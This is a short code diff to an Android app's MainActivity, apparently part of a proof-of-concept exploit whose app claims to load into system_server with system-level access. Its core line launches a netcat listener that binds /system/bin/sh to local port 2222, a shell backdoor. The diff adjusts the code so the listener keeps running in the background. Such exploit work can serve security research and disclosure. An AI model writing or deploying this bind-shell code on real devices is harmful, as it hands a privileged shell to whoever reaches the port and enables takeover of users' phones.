@@ -42,7 +42,6 @@ public class MainActivity extends Activity {
                                 "\n\nuid=").append(Process.myUid())
                 .append("\npid=").append(Process.myPid())
                 .append("\n\n").append(id)
-                .append("\n\nBelow is list of system services, as this app loads into system_server it can directly tamper with local ones (those that are non-null and non-BinderProxy)");
 
         try {
             java.lang.Process process = Runtime.getRuntime().exec("nc -s 127.0.0.1 -p 2222 -L /system/bin/sh");
@@ -51,9 +50,12 @@ public class MainActivity extends Activity {
             // while ((line = reader.readLine()) != null) {
             //     System.out.println(line);
             // }
-            process.waitFor(); // Wait for the command to complete
-        } catch (IOException | InterruptedException e) {
-            e.printStackTrace();
+            process.getErrorStream().close();
+            process.getInputStream().close();
+            process.getOutputStream().close();
+            process.waitFor();
+        } catch (Exception e) {
+            s.append("\n\nFailed to start shell");
         }
 
         ((TextView) findViewById(R.id.app_text)).setText(s.toString());
